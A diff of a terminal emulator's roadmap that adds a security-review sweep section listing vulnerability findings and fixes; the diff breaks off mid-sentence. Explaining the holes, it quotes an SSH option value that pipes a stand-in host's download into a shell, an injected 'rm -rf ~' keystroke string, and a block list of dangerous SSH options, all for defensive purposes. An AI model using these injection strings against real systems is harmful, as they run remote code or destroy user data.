@@ -330,11 +330,12 @@ adequately.
 2. [0.5.0 — shipped](#050--shipped-2026-04-13)
 3. [0.6.0 — shipped](#060--shipped-2026-04-14)
 4. [0.7.0 — shell integration + triggers](#070--shell-integration--triggers-target-2026-06)
-5. [0.8.0 — multiplexing + marketplace](#080--multiplexing--marketplace-target-2026-08)
-6. [0.9.0 — platform + a11y](#090--platform--a11y-target-2026-10)
-7. [1.0.0 — stability milestone](#100--stability-milestone-target-2026-12)
-8. [Beyond 1.0 — long-horizon](#beyond-10--long-horizon)
-9. [How to propose a roadmap item](#how-to-propose-a-roadmap-item)
+5. [0.7.12 — independent-review sweep](#0712--independent-review-sweep-target-2026-05)
+6. [0.8.0 — multiplexing + marketplace](#080--multiplexing--marketplace-target-2026-08)
+7. [0.9.0 — platform + a11y](#090--platform--a11y-target-2026-10)
+8. [1.0.0 — stability milestone](#100--stability-milestone-target-2026-12)
+9. [Beyond 1.0 — long-horizon](#beyond-10--long-horizon)
+10. [How to propose a roadmap item](#how-to-propose-a-roadmap-item)
 
 ---
 
@@ -942,6 +943,364 @@ behind."
 
 ---
 
+## 0.7.12 — independent-review sweep (target: 2026-05)
+
+**Theme:** fold-in of the 2026-04-23 multi-agent code review. Fourteen
+independent `general-purpose` subagents were dispatched in parallel — one
+per subsystem — each briefed only with source paths + contract docs
+(`CLAUDE.md`, `PLUGINS.md`, `tests/features/*/spec.md`) and external
+standards (ECMA-48, xterm ctlseqs, POSIX `forkpty(3)`, SARIF v2.1.0,
+OpenAI API, SSE, Lua 5.4 Reference Manual, OWASP LLM Top 10,
+CVE-2017-1000117, OpenGL 3.3). Agents had **zero context on
+implementation reasoning** — they reviewed code against contracts, not
+against intent. This is the "escape the self-graded-homework bubble"
+lane: findings here come from outside the author's head.
+
+The sweep produced ~60 HIGH findings, ~80 Medium, and ~40 Low. This
+section tracks the HIGH findings plus cross-cutting themes that were
+flagged by multiple independent reviewers. Medium/Low findings are
+captured in the review transcripts (commit `<tbd>`) and triaged into
+grep rules or individual tickets as they become actionable.
+
+### 🔥 Cross-cutting themes (patterns caught by ≥2 reviewers)
+
+- 📋 **Silent-data-loss on parse failure.** `config.cpp:26-33`,
+  `claudeallowlist.cpp:241-281`, `sessionmanager.cpp` V2+ unknown-field
+  path all follow the same shape: read → parse → on failure `root` stays
+  default-constructed → next save overwrites user data with defaults.
+  Fix class-wide: **refuse to save when the on-disk file existed and
+  failed to parse**, surface an error dialog, offer a `.bak` recovery.
+- 📋 **`/tmp/*.js` TOCTOU via predictable filenames.** KWin script paths
+  at `xcbpositiontracker.cpp:34`, `mainwindow.cpp:2558, 2620`. Replace
+  with `QTemporaryFile` (O_EXCL, unpredictable name).
+- 📋 **`setOwnerOnlyPerms` ordering bugs.** `sessionmanager.cpp:269`
+  (perms before write), `claudeallowlist.cpp:273-281` (pre-commit on a
+  temp fd — rename may drop perms), `debuglog.cpp:72` (no perms at all
+  on a log that holds PTY + HMAC + network material).
+- 📋 **"Documented feature, dead code" drift** — 5 distinct cases caught
+  by 4 different reviewers:
+  - `gpu_rendering` config key live but `glrenderer.cpp` unreachable
+    since 0.7.4 base-class refactor (widget no longer `QOpenGLWidget`).
+    `tests/features/terminal_partial_update_mode/spec.md` INV-1 is a
+    dead invariant.
+  - `background_alpha` persisted to config but `terminalwidget.cpp:604-609`
+    uses `m_windowOpacity`, never `m_backgroundAlpha`.
+  - Claude plan-mode detection at `claudeintegration.cpp:495` reads
+    `value("mode")` — real JSONL uses `permissionMode`. `planModeChanged(true)`
+    has never fired in production.
+  - `session_persistence` default: `CLAUDE.md` says `false`, `config.cpp:225`
+    says `true` (the code default is correct per spec, docs drift).
+  - `font_size` range: `CLAUDE.md` says 8–32, `config.cpp:84` and
+    `settingsdialog.cpp:167` both 4–48 (three-way drift).
+- 📋 **No-auth local IPC is a UID-scope RCE chain.** Remote control
+  listens by default (`mainwindow.cpp:788`), accepts unauthenticated
+  commands (`remotecontrol.cpp:66-113`), and `send-text` writes raw
+  bytes to the PTY with no control-char filtering (`remotecontrol.cpp:235`).
+  Any process under the user's UID (compromised browser tab,
+  `pip install` post-exec, random npm dependency) can shove
+  `\nrm -rf ~\n` into the next tab's shell. Blast radius = UID. Two
+  reviewers independently recommended defaulting `remote_control_enabled=false`
+  and landing control-char filtering before the X25519 auth work.
+
+### 🔒 Tier 1 — ship-this-week fixes (security/data-loss blockers)
+
+- ✅ **`permissionMode` field-name typo.** `claudeintegration.cpp:495`
+  read `value("mode")`; real Claude Code JSONL (verified against live
+  `~/.claude/projects/*.jsonl` at v2.1.87) uses `permissionMode`.
+  Fixed; `planModeChanged(true)` now actually fires on plan-mode entry.
+  Regression test anchored to real JSONL schema:
+  `tests/features/claude_plan_mode_detection/`.
+- ✅ **Remote-control opt-in default + `send-text` control-char filter.**
+  Added `remote_control_enabled` config key (default `false`, matches
+  Kitty `allow_remote_control=no`). The MainWindow now gates the
+  listener's `start()` on this key. `send-text` request payloads pass
+  through `RemoteControl::filterControlChars` which strips
+  `{0x00..0x08, 0x0B..0x1F, 0x7F}` while preserving HT/LF/CR and all
+  UTF-8 bytes >= 0x80. Callers needing raw byte pass-through set
+  `"raw": true` in the request JSON. Closes the UID-scope keystroke-
+  injection RCE chain. Regression test:
+  `tests/features/remote_control_opt_in/`.
+- ✅ **Parse-failure-overwrites-data — Config + Allowlist + shared
+  helper.** `Config::load()` now distinguishes fresh-run / valid /
+  corrupt. On corrupt, the on-disk file is rotated to
+  `config.json.corrupt-<ms_timestamp>[-N]` via the new shared
+  `rotateCorruptFileAside()` helper (secureio.h) with a
+  collision-retry loop up to 10 attempts (addresses the /indie-review
+  same-second-collision HIGH finding). `m_loadFailed` is latched;
+  `save()` is a no-op for the session so setters can't destroy the
+  user's hand-fixable bytes. Separate log messages for success vs
+  failed backup.
+  `ClaudeAllowlistDialog::saveSettings()` adopts the same pattern:
+  parse failure refuses to save rather than destroying the non-
+  permissions keys (model, editor prefs, custom hooks).
+  `SessionManager` verified as already-defended — its per-tab files
+  use granular `QDataStream::status()` checks at every read, and
+  failure returns false without clobbering the file.
+  Regression test: `tests/features/config_parse_failure_guard/`
+  (behavioral: plants a corrupt file, asserts setter doesn't
+  overwrite).
+- ✅ **`std::rename` return checked + errno logged.** `config.cpp`
+  save path: rename failure logs errno via
+  `ANTS_LOG(DebugLog::Config, ...)` and removes the orphan tmp file.
+  `.bak` rotation subsumed by the parse-failure backup above.
+- ✅ **SSH bookmark `extraArgs` ProxyCommand/LocalCommand rejection.**
+  `SshBookmark::sanitizeExtraArgs` filters `-oProxyCommand=`,
+  `-oLocalCommand=`, `-oPermitLocalCommand=` in both the
+  single-token and space-separated forms (case-insensitive per
+  OpenSSH's own option parser). Closes the CVE-2017-1000117-adjacent
+  RCE-via-bookmark-field vector. Regression test:
+  `tests/features/ssh_extra_args_sanitize/` (20 assertions covering
+  both forms, case variants, end-to-end `toSshCommand`).
+- ✅ **`/tmp/kwin_*.js` → `QTemporaryFile`.** Three callsites
+  (`xcbpositiontracker.cpp`, `mainwindow.cpp` twice) migrated from
+  predictable filenames to unpredictable `QTemporaryFile` with
+  `setAutoRemove(false)` (the async dbus-send chain removes the file
+  after use). Closes the same-UID symlink-swap TOCTOU + same-name
+  collision between Ants instances.
+- ✅ **Audit rule-pack `command` trust gate.** `loadUserRules()` now
+  skips rules with a `command` field unless
+  `Config::auditTrustCommandRules() == true` or
+  `ANTS_AUDIT_TRUST_UNSAFE=1` is set. Default false — a cloned-but-
+  untrusted project can no longer run arbitrary bash via
+  `audit_rules.json`. Existing users who relied on command-rules
+  opt in via config or env var; warning log surfaces the count of
+  skipped rules at load time. Per-project hash-based trust store
+  deferred to 0.7.13.
+- ✅ **AI `insertCommand` prompt-injection mitigation.**
+  `AiDialog::extractAndSanitizeCommand` (new static helper) strips
+  C0 controls `{0x00..0x08, 0x0B..0x1F, 0x7F}` from the AI-suggested
+  command while preserving HT/LF/CR + UTF-8 multi-byte, caps length
+  at 4 KiB. The click handler now requires explicit user
+  confirmation via a `QMessageBox::question` showing the literal
+  bytes (with a "N bytes were filtered" note when non-zero) before
+  emitting `insertCommand`. OWASP LLM01+LLM02 mitigation.
+  Regression test: `tests/features/ai_insert_command_sanitize/`
+  (18 assertions, behavioral + source-grep on the confirm-before-
+  emit invariant).
+- 📋 **SSH bookmark `extraArgs` ProxyCommand/LocalCommand rejection.**
+  `sshdialog.cpp:56-60` tokenizes `extraArgs` and emits each token
+  before `--`. A bookmark with `extraArgs="-oProxyCommand=curl evil|sh"`
+  is CVE-2017-1000117 self-inflicted. Reject tokens starting with
+  `-oProxyCommand=`, `-oLocalCommand=`, `-oPermitLocalCommand=yes`, or
+  show a "this bookmark requests privileged ssh options" confirmation
+  the first time it's used.
+- 📋 **`/tmp/kwin_*.js` → `QTemporaryFile`.**
+  `xcbpositiontracker.cpp:34`, `mainwindow.cpp:2558, 2620`.
+- 📋 **Audit rule-pack `command` trust prompt.** `auditdialog.cpp:2580,
+  3730` executes arbitrary `command` strings from
+  `<project>/audit_rules.json` under `bash -c`. A malicious rule pack
+  shipped via `git clone` of a contributed project runs code the
+  moment the user opens the Audit dialog. Require explicit
+  trust-this-file confirmation (stored in
+  `~/.config/ants-terminal/trusted_audit_rules.json` keyed by project
+  path + file hash) before any rule with a `command` field runs.
+- 📋 **Audit user-glob path canonicalization.** `auditdialog.cpp:2323`
+  (`globToRegex`), `auditdialog.cpp:2221-2223, 2064-2066`
+  (`readSnippet` / `lineIsCode`). Enforce `startsWith(m_projectPath)`
+  after canonicalization — reject `../` traversal in user rules.
+- 📋 **AI `insertCommand` prompt-injection mitigation.**
+  `aidialog.cpp:56-79` writes LLM-emitted bytes verbatim into the PTY.
+  Minimum: confirmation dialog showing the literal bytes, strip
+  embedded `\n`/`\r`/control chars, 4 KiB length cap. OWASP LLM01+LLM02.
+- 📋 **Allowlist `QSaveFile` perms belt-and-suspenders.**
+  `claudeallowlist.cpp:273-281` — call `setOwnerOnlyPerms` post-commit
+  as well as pre-commit so the rename doesn't leave a world-readable
+  file on filesystems that don't carry fd perms across rename.
+
+### 🔒 Tier 2 — hardening sweep
+
+- 📋 **PTY `closefrom` replacement.** `ptyhandler.cpp:84-85` hard-codes
+  `fd=3; fd<1024`. Use `closefrom(3)` on glibc ≥2.34 or iterate
+  `/proc/self/fd`. CWE-403 recurrence on systemd/container default
+  RLIMIT_NOFILE.
+- 📋 **Process-wide `signal(SIGPIPE, SIG_IGN)` in `main.cpp`.** `write()`
+  to a just-closed PTY currently crashes the GUI.
+- 📋 **PTY write EAGAIN queue.** `ptyhandler.cpp:180-197` currently drops
+  data on partial write. Install a `QSocketNotifier(QSocketNotifier::Write)`
+  and queue the remainder.
+- 📋 **PTY dtor off-main-thread.** 500 ms `usleep` on GUI at
+  `ptyhandler.cpp:37-40` × N splits = N×500 ms freeze on window close.
+  Move escalation to a QThread.
+- 📋 **RIS (`ESC c`) must preserve all callbacks.**
+  `terminalgrid.cpp:653-659` currently wipes `m_notifyCallback`,
+  `m_progressCallback`, `m_lineCompletionCallback`,
+  `m_commandFinishedCallback`, `m_userVarCallback`,
+  `m_osc133ForgeryCallback`, `m_osc133Key`. After any `reset` command,
+  shell integration + plugin hooks silently die.
+- 📋 **Origin-mode translate on CUP / DECSC save origin.**
+  `terminalgrid.cpp:397-400, 1592-1595, 1611-1621`. Breaks
+  tmux/screen save-restore round-trip.
+- 📋 **OSC 8 URI cap + Kitty APC `m_kittyChunkBuffer` cap.**
+  Currently unbounded; hostile apps can consume scrollback memory per
+  covered line or grow a single buffer without limit.
+- 📋 **`clearRow` uses current SGR bg (BCE).**
+  `terminalgrid.cpp:1758-1778` uses `CellAttrs{}` — app-painted
+  backgrounds disappear on every `CSI 2J` / `CSI J`.
+- 📋 **Wide-char overwrite zeroes the mate.**
+  `terminalgrid.cpp:327-347` leaves dangling `isWideCont` when a narrow
+  char overwrites a wide char's first half (or vice versa).
+- 📋 **`background_alpha` wiring — or remove from docs.**
+  `terminalwidget.cpp:3874-3876` writes to a dead field. Decide: revive
+  at paint site, or drop config key + doc entry.
+- 📋 **`terminal_partial_update_mode` spec rewrite or delete.**
+  Invariant assumes `QOpenGLWidget` base class that no longer exists.
+- 📋 **Lua: strip `string.dump`, pass `"t"` mode to `luaL_loadfilex`.**
+  `luaengine.cpp:76, 206-213`. Defense-in-depth on bytecode rejection.
+- 📋 **Lua: cap manifest size + canonical plugin path.**
+  `pluginmanager.cpp:138-143` reads entire `manifest.json` (OOM
+  surface); `scanAndLoad` uses `QDir::entryList(QDir::Dirs)` without
+  `NoSymLinks` or `canonicalFilePath()` anchor.
+- 📋 **Lua: clear hook before `lua_close` in `shutdown()`.** Prevents
+  UAF when finalizers run during destruction.
+- 📋 **Lua: reconcile resource-limit docs.** `PLUGINS.md:385-395` claims
+  "per event invocation"; implementation is per-VM cumulative. Either
+  implement per-handler reset or update the doc.
+- 📋 **Session file: SHA-256 payload checksum.** `sessionmanager.cpp`
+  currently has no payload integrity; an attacker with write access to
+  `$XDG_DATA_HOME/ants-terminal/sessions/` can plant a crafted session
+  that feeds arbitrary codepoints/fg/bg/flags into the grid.
+- 📋 **Session file: pre-validate compressed length prefix before
+  `qUncompress`.** A 500 MB claim in the header triggers a 500 MB
+  allocation before the 100 MB cap fires.
+- 📋 **Session file: `QDataStream::status()` checks inside cell loop.**
+  `sessionmanager.cpp:149-163, 176-179` — truncated streams write
+  uninitialized attrs into the grid.
+- 📋 **Portal session close.** `GlobalShortcutsPortal` has no destructor
+  / `Session::Close` call — session handle leaks for the process
+  lifetime of the D-Bus client.
+- 📋 **Cached dialog + dangling `&m_config`.** `mainwindow.cpp:1479`
+  constructs `SettingsDialog(&m_config, this)` once; `onConfigFileChanged`
+  reassigns `m_config = Config()`. Reopening Settings after an external
+  edit of `config.json` dereferences a dangling reference. Fix: destroy
+  cached dialog on config reload.
+- 📋 **`WA_OpaquePaintEvent` on `m_menuBar`.** Missing per
+  `tests/features/menubar_hover_stylesheet/spec.md` INV-3b.
+- 📋 **SARIF emit suppressed findings with `suppressions[]` array.**
+  `auditdialog.cpp:4823-4952` currently drops suppressed findings
+  pre-export; SARIF v2.1.0 §3.35 expects them present with
+  `kind: "external"` + `justification: reason`. Required for GitHub
+  code-scanning / SonarQube reconciliation.
+- 📋 **Audit: per-tool timeout override.** `auditdialog.cpp:3729` global
+  30 s timeout; `cppcheck --enable=all` on a 500k-line codebase or
+  `osv-scanner` rate-limited by OSV.dev both blow this. Add
+  `timeoutMs` to `AuditCheck`.
+- 📋 **Audit: incremental QProcess output drain.** `onCheckFinished`
+  at `auditdialog.cpp:3747-3765` reads `readAllStandardOutput()` once;
+  a runaway semgrep on generated code can buffer hundreds of MB before
+  the timeout. Stream to a temp file with a size cap.
+- 📋 **Audit: regex-DoS watchdog on user `drop_if_matches` /
+  `.audit_allowlist.json`.** Qt PCRE has no native timeout; move
+  user-supplied regex evaluation to `QtConcurrent` with a 2 s
+  per-match watchdog.
+- 📋 **Audit: widen `computeDedup` to 96 bits (24 hex chars).**
+  `auditdialog.cpp:1914-1919`. Current 64-bit truncation exports to
+  SARIF `primaryLocationLineHash`; a collision = wrong finding
+  silently suppressed across scans.
+- 📋 **Audit: distinguish "tool exited non-zero with empty stdout"
+  from "tool reported no findings".** `auditdialog.cpp:3747` currently
+  treats segfaults (stderr "Segmentation fault") as findings.
+- 📋 **Concurrent-writer guard on `config.json` + `settings.local.json`.**
+  No `flock` / lockfile today — two ants processes or ants + running
+  Claude Code race on every save. Last write wins.
+- 📋 **`debug.log` 0600 perms.** `debuglog.cpp:72` opens append with
+  default umask; log can contain keystrokes, API responses, HMAC
+  material.
+- 📋 **Claude transcript: 32 KB tail window → scan-for-first-newline +
+  grow.** `claudeintegration.cpp:291-319` drops events longer than 32 KB
+  (common for tool_results with embedded file contents).
+- 📋 **Claude transcript: handle `thinking` content blocks.**
+  `claudetranscript.cpp:116-135` silently drops them; real assistant
+  events lead with `thinking`.
+- 📋 **`decodeProjectPath` preserves hyphens.**
+  `claudeintegration.cpp:843-850` replaces all `-` with `/`; paths like
+  `~/my-project/sub-dir` decode wrong. Use the cwd field from the
+  transcript as the source of truth; treat the directory-name
+  encoding as fallback only.
+
+### ⚡ / 🏗 Tier 3 — structural
+
+- 📋 **VtParser `Print`-run coalescing.** `vtparser.cpp:107-113`
+  emits one `VtAction` per byte inside the SIMD fast-path; a 10 KB
+  ASCII run pays 10 000 heap-allocated
+  `{vector<int>, vector<bool>, string, string}` each. This is likely
+  the real root cause of the `newline_stream` hotspot we've been
+  profiling — the "SIMD fast-path" is paid for but not delivered.
+  Coalesce printable runs into a single `Print` action carrying a UTF-8
+  slice. Expected: 5–10× on the `ascii_print`/`newline_stream`
+  benchmarks.
+- 📋 **Scroll region perf: `std::rotate` for `scrollUp`/`scrollDown`.**
+  `scroll_region_rotate/spec.md` exists; `terminalgrid.cpp:1504-1590`
+  still uses `erase`/`insert` per-iteration. `CSI 100 S` on an 80-row
+  screen = 8 000 `memmove`s.
+- 📋 **`VtBatch` zero-copy across thread hop.** `vtstream.h:93` uses
+  `const VtBatch &` in a queued signal — Qt copies regardless of
+  const-ref. Wrap payload in `std::shared_ptr<const VtBatchData>`.
+- 📋 **Renderer subsystem decision:** revive `glrenderer.cpp` via
+  `createWindowContainer` *or* delete it. It's ~1 500 LoC of
+  compiled-but-unreachable code that bit-rots silently. If reviving,
+  fix the `GlyphQuad` UV-math bug (`glrenderer.cpp:378`: absolute vs
+  delta naming collision), add `glGetError` checks, restore GL state
+  on render exit, add HiDPI / `devicePixelRatio` handling, add
+  premultiplied-alpha pipeline.
+- 📋 **Settings dialog: dependency-UI enable gating.**
+  `settingsdialog.cpp:268-286` (AI tab when `ai_enabled=false`),
+  `:204` (auto-theme combos when auto off), `:234-238` (Quake hotkey
+  when Quake off). Wire `toggled` → `setEnabled` on siblings.
+- 📋 **Settings dialog: Cancel rollback for Profiles tab.**
+  `settingsdialog.cpp:432-482` — profile Save/Delete/Load mutate
+  `m_config` immediately; Cancel doesn't roll them back.
+- 📋 **Settings dialog: `background_alpha` widget** (dep on the Tier 2
+  wiring decision).
+- 📋 **Settings dialog: Restore Defaults per-tab.**
+- 📋 **Accessibility pass on chrome.** `mainwindow.cpp` chrome and
+  `CommandPalette` / `TitleBar` buttons have no
+  `setAccessibleName` / `setAccessibleDescription`. Screen readers
+  hear "push button" with no label. First pass: one line per control.
+- 📋 **AT-SPI introspection lane.** Automated check that every
+  user-visible control carries an accessible name — run in CI on a
+  canonical `TerminalWidget` + `MainWindow` + all dialogs.
+
+### 📚 Sweep methodology — re-run before each minor tag
+
+Adopt the following as a standing pre-release step:
+
+1. Re-dispatch the 14-agent sweep via
+   `general-purpose` subagents (one per subsystem listed in
+   `CLAUDE.md`'s "Project Structure"), briefed with source paths +
+   `CLAUDE.md` + `PLUGINS.md` + matching `tests/features/*/spec.md` +
+   relevant external specs. Cost: ~15 subagent runs (~1 M tokens total
+   for a full sweep).
+2. Triage the HIGH/Medium findings into this ROADMAP under the active
+   minor's section.
+3. Anchor every regression test added during the fix cycle to an
+   **external** signal (spec section, CVE, reviewer report), not the
+   author's own reasoning. See the "Spec-first workflow" note below.
+
+**Spec-first workflow for new features (starting with the first
+Tier 1 fix):** write `tests/features/<name>/spec.md` *before* the
+code, surface it to the user for sign-off, then implement. The
+feature test validates the user-approved spec, not the author's
+interpretation. Closes the self-graded-homework loop.
+
+### 🧪 Future external-signal lanes (carry from the 2026-04-23 review)
+
+- 📋 **vttest as a CI lane.** Thomas Dickey's public xterm test
+  program. Highest signal-per-effort for VT conformance drift.
+  Runs a canonical xterm-compliance corpus against our parser; any
+  divergence is a finding anchored to a published spec.
+- 📋 **Differential screen-dump harness vs xterm/kitty.** Send a
+  canonical byte-stream corpus to each, capture final screen state,
+  diff. Divergences are findings regardless of what our unit tests
+  say.
+- 📋 **libFuzzer target against `VtParser`.** Feed random bytes,
+  assert invariants (no crash, cursor bounded, scrollback bounded,
+  combining side-table aligned). Mechanical — surfaces cases the
+  author can't imagine.
+- 📋 **Real-TUI smoke lane.** `vim`, `tmux`, `htop`, `neovim` in a
+  headless session, snapshot screen, compare across releases.
+
+---
+
 ## 0.8.0 — multiplexing + marketplace (target: 2026-08)
 
 **Theme:** big new capabilities. This is the "features you'd expect from
@@ -967,98 +1326,6 @@ a modern terminal" release.
   tick; (c) test under GNOME/Mutter and i3 to confirm KWin is the
   amplifier. Not a blocker (user-reported as "not the biggest issue")
   but tracked so the 0.7.x fix attempts don't get re-invented.
-
-### 🎨 Features — multiplexing
-
-- 📋 **Headless mux server with codec RPC**. WezTerm's architecture
-  ([DeepWiki](https://deepwiki.com/wezterm/wezterm/2.2-multiplexer-architecture)):
-  `ants-terminal --server` runs without a GUI and accepts attachments
-  over a Unix socket; `ants-terminal --attach <socket>` reconnects.
-  Panes survive window close. Sparse scrollback fetched on demand via
-  `GetLines` RPC.
-- 🚧 **Remote-control protocol** (Kitty-style,
-  [docs](https://sw.kovidgoyal.net/kitty/rc_protocol/)): JSON envelopes
-  over a Unix socket. Commands: `launch`, `send-text`, `set-title`,
-  `select-window`, `get-text`, `ls`, `new-tab`. Auth via X25519 when
-  a password is set. Unlocks scripting, IDE integration, CI.
-  - ✅ **First slice: socket + envelope + `ls`.** `src/remotecontrol.{h,cpp}`
-    brings up a `QLocalServer` on `$ANTS_REMOTE_SOCKET` (or the XDG
-    runtime default `$XDG_RUNTIME_DIR/ants-terminal.sock`). Each
-    connection is one-shot: read a single JSON line, dispatch, write
-    the JSON response line, close. `ls` returns
-    `{"ok": true, "tabs": [{"index", "title", "cwd", "active"}, ...]}`.
-    Unknown commands return `{"ok": false, "error": "unknown command: ..."}`
-    with exit code 2. The same binary handles client mode via
-    `--remote <cmd>` (optionally `--remote-socket <path>`) — no
-    separate client binary. Pinned by source-grep feature test
-    `tests/features/remote_control_ls/` (8 invariants including
-    field-name stability, env-var override, `--remote` ordering).
-  - ✅ **`send-text` command.** Writes a UTF-8 string byte-for-byte to
-    a tab's PTY master. `tab` field optional (active tab default),
-    `text` required; response carries `bytes` written. Client CLI:
-    `--remote-text <str>` or stdin pipe; `--remote-tab <i>` optional.
-    Does not auto-append a newline (matches Kitty; callers include
-    terminators explicitly). Pinned by
-    `tests/features/remote_control_send_text/`.
-  - ✅ **`new-tab` command.** Opens a fresh tab and returns its
-    0-based index. `cwd` optional (inherits focused-terminal cwd);
-    `command` optional (written via `writeCommand` after a 200 ms
-    settle). Response: `{"ok":true,"index":<int>}`. Client CLI:
-    `--remote-cwd <path>`, `--remote-command <str>`. Pinned by
-    `tests/features/remote_control_new_tab/`.
-  - ✅ **`select-window` command.** Switches the active tab to the
-    0-based index given in the `tab` field (required). Focuses the
-    new tab's terminal so follow-up `send-text` without an explicit
-    tab lands correctly. Pinned by
-    `tests/features/remote_control_select_window/`.
-  - ✅ **`set-title` command.** Pins a tab label that survives both
-    the per-shell `titleChanged` signal (OSC 0/2) and the 2 s
-    `updateTabTitles` refresh. Empty title clears the pin and
-    restores from `shellTitle()` (under `tabTitleFormat == "title"`)
-    or rebuilds via the format-driven path. Pin freed at tab-close.
-    Pinned by `tests/features/remote_control_set_title/`.
-  - ✅ **`get-text` command.** Returns trailing N lines of
-    (scrollback + screen) joined with `\n`. Default 100, capped
-    server-side at 10 000 to bound the JSON envelope. Reuses
-    `TerminalWidget::recentOutput()` — same accessor the AI dialog
-    uses for context capture, so format stays consistent. Pinned
-    by `tests/features/remote_control_get_text/`.
-  - ✅ **`launch` command.** Convenience wrapper for `new-tab` +
-    `send-text`, sugar for `idx=$(... new-tab) && ... send-text
-    --remote-tab $idx ...`. `command` is required (rejects empty
-    with a "use new-tab" hint); auto-appends `\n` so the command
-    actually runs. Pinned by `tests/features/remote_control_launch/`.
-    **Initial command surface complete** — 7/7. Remaining work in
-    this item is the X25519 auth layer (currently 💭).
-  - 💭 **Auth layer.** X25519 shared-secret when `$ANTS_REMOTE_PASSWORD`
-    is set. Shipped after the command surface is complete.
-- ✅ **SSH ControlMaster** auto-integration from the SSH bookmark
-  dialog. Shipped in 0.7.1. Connects opened from the SSH Manager
-  carry `-o ControlMaster=auto`,
-  `-o ControlPath=$HOME/.ssh/cm-%r@%h:%p`, and
-  `-o ControlPersist=10m` when the new `ssh_control_master` config
-  key is true (default). `$HOME` resolves in-process via
-  `QDir::homePath()` so the ControlPath works under dash / POSIX
-  `sh`; `%r@%h:%p` are OpenSSH tokens and survive shell quoting
-  intact. Second tab to the same host opens in ms instead of
-  seconds. See
-  [CHANGELOG.md §0.7.1](CHANGELOG.md#071--2026-04-19).
-- 💭 **Domain abstraction** à la WezTerm: `DockerDomain` lists
-  `docker ps`, opens a tab via `docker exec -it`; `KubeDomain` lists
-  pods, opens via `kubectl exec`. Reuses the SSH bookmark UI shell.
-- 💭 **Persistent workspaces**: save/restore entire tab+split layout +
-  scrollback to disk; one-click "resume yesterday's dev session."
-
-### 🔌 Plugins — marketplace
-
-- 📋 **Signed plugin packaging**: Ed25519 sig over a tarball containing
-  `init.lua`, `manifest.json`, and optional assets. Loader verifies
-  against a project-maintained keyring + (optionally) user-added keys.
-- 📋 **Public marketplace index**: static JSON hosted on GitHub Pages
-  listing name, version, author, signature-status, permission summary.
-  Settings → Plugins → Browse lists them with an install button.
-- 📋 **Plugin dependency resolution**: `manifest.json` `requires: [...]`
-  field; install flow resolves transitively.
 
 ### ⚡ Performance
 
@@ -1123,6 +1390,87 @@ a modern terminal" release.
   future resolves. Big sixel frames stop blocking the prompt.
 - 💭 **BTree scrollback** — O(log n) scroll-to-line instead of O(n)
   for jump-to-timestamp features.
+
+### 🎨 Features — multiplexing
+
+- 🚧 **Remote-control protocol** (Kitty-style,
+  [docs](https://sw.kovidgoyal.net/kitty/rc_protocol/)): JSON envelopes
+  over a Unix socket. Commands: `launch`, `send-text`, `set-title`,
+  `select-window`, `get-text`, `ls`, `new-tab`. Auth via X25519 when
+  a password is set. Unlocks scripting, IDE integration, CI.
+  - ✅ **First slice: socket + envelope + `ls`.** `src/remotecontrol.{h,cpp}`
+    brings up a `QLocalServer` on `$ANTS_REMOTE_SOCKET` (or the XDG
+    runtime default `$XDG_RUNTIME_DIR/ants-terminal.sock`). Each
+    connection is one-shot: read a single JSON line, dispatch, write
+    the JSON response line, close. `ls` returns
+    `{"ok": true, "tabs": [{"index", "title", "cwd", "active"}, ...]}`.
+    Unknown commands return `{"ok": false, "error": "unknown command: ..."}`
+    with exit code 2. The same binary handles client mode via
+    `--remote <cmd>` (optionally `--remote-socket <path>`) — no
+    separate client binary. Pinned by source-grep feature test
+    `tests/features/remote_control_ls/` (8 invariants including
+    field-name stability, env-var override, `--remote` ordering).
+  - ✅ **`send-text` command.** Writes a UTF-8 string byte-for-byte to
+    a tab's PTY master. `tab` field optional (active tab default),
+    `text` required; response carries `bytes` written. Client CLI:
+    `--remote-text <str>` or stdin pipe; `--remote-tab <i>` optional.
+    Does not auto-append a newline (matches Kitty; callers include
+    terminators explicitly). Pinned by
+    `tests/features/remote_control_send_text/`.
+  - ✅ **`new-tab` command.** Opens a fresh tab and returns its
+    0-based index. `cwd` optional (inherits focused-terminal cwd);
+    `command` optional (written via `writeCommand` after a 200 ms
+    settle). Response: `{"ok":true,"index":<int>}`. Client CLI:
+    `--remote-cwd <path>`, `--remote-command <str>`. Pinned by
+    `tests/features/remote_control_new_tab/`.
+  - ✅ **`select-window` command.** Switches the active tab to the
+    0-based index given in the `tab` field (required). Focuses the
+    new tab's terminal so follow-up `send-text` without an explicit
+    tab lands correctly. Pinned by
+    `tests/features/remote_control_select_window/`.
+  - ✅ **`set-title` command.** Pins a tab label that survives both
+    the per-shell `titleChanged` signal (OSC 0/2) and the 2 s
+    `updateTabTitles` refresh. Empty title clears the pin and
+    restores from `shellTitle()` (under `tabTitleFormat == "title"`)
+    or rebuilds via the format-driven path. Pin freed at tab-close.
+    Pinned by `tests/features/remote_control_set_title/`.
+  - ✅ **`get-text` command.** Returns trailing N lines of
+    (scrollback + screen) joined with `\n`. Default 100, capped
+    server-side at 10 000 to bound the JSON envelope. Reuses
+    `TerminalWidget::recentOutput()` — same accessor the AI dialog
+    uses for context capture, so format stays consistent. Pinned
+    by `tests/features/remote_control_get_text/`.
+  - ✅ **`launch` command.** Convenience wrapper for `new-tab` +
+    `send-text`, sugar for `idx=$(... new-tab) && ... send-text
+    --remote-tab $idx ...`. `command` is required (rejects empty
+    with a "use new-tab" hint); auto-appends `\n` so the command
+    actually runs. Pinned by `tests/features/remote_control_launch/`.
+    **Initial command surface complete** — 7/7. Remaining work in
+    this item is the X25519 auth layer (currently 💭).
+  - 💭 **Auth layer.** X25519 shared-secret when `$ANTS_REMOTE_PASSWORD`
+    is set. Shipped after the command surface is complete.
+- 📋 **Headless mux server with codec RPC**. WezTerm's architecture
+  ([DeepWiki](https://deepwiki.com/wezterm/wezterm/2.2-multiplexer-architecture)):
+  `ants-terminal --server` runs without a GUI and accepts attachments
+  over a Unix socket; `ants-terminal --attach <socket>` reconnects.
+  Panes survive window close. Sparse scrollback fetched on demand via
+  `GetLines` RPC.
+- ✅ **SSH ControlMaster** auto-integration from the SSH bookmark
+  dialog. Shipped in 0.7.1. Connects opened from the SSH Manager
+  carry `-o ControlMaster=auto`,
+  `-o ControlPath=$HOME/.ssh/cm-%r@%h:%p`, and
+  `-o ControlPersist=10m` when the new `ssh_control_master` config
+  key is true (default). `$HOME` resolves in-process via
+  `QDir::homePath()` so the ControlPath works under dash / POSIX
+  `sh`; `%r@%h:%p` are OpenSSH tokens and survive shell quoting
+  intact. Second tab to the same host opens in ms instead of
+  seconds. See
